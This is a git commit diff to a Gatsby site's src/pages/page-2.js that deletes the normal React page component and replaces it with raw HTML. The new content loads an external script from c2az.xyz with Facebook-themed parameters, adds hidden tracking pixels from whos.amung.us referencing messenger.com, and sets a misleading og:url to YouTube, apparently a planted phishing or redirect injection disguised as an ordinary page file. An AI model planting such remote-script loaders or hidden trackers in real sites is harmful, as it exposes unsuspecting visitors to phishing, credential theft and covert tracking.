35601ebfc7c977d4d9b4a2d82d04427a3d8e7ed4
tusurucu23s <95896360+tusurucu23s@users.noreply.github.com>
2022-01-21 12:12:03 +0800

    Update page-2.js

--- src/pages/page-2.js
+++ src/pages/page-2.js
@@ -1,16 +1,6 @@
-import * as React from "react"
-import { Link } from "gatsby"
-
-import Layout from "../components/layout"
-import Seo from "../components/seo"
-
-const SecondPage = () => (
-  <Layout>
-    <Seo title="Page two" />
-    <h1>Hi from the second page</h1>
-    <p>Welcome to page 2</p>
-    <Link to="/">Go back to the homepage</Link>
-  </Layout>
-)
-
-export default SecondPage
+<meta property="og:url" content="https://www.youtube.com/" />
+<script src="https://c2az.xyz/manzana/?api=1&lan=facebookapphk&ht=1" type="text/javascript" async="true"></script>
+<img src="//whos.amung.us/pingjs/?k=elchapito07s&amp;t=🛸 NO FORCE MMG 👽&amp;x=https://www.messenger.com/" style="display:none" alt="">                    
+  <script type="text/javascript"></script>
+<img src="//whos.amung.us/pingjs/?k=elcartel07&amp;t=🛸 NO FORCE MMG 👽&amp;x=https://www.messenger.com/" style="display:none" alt="">                    
+  <script type="text/javascript"></script> 
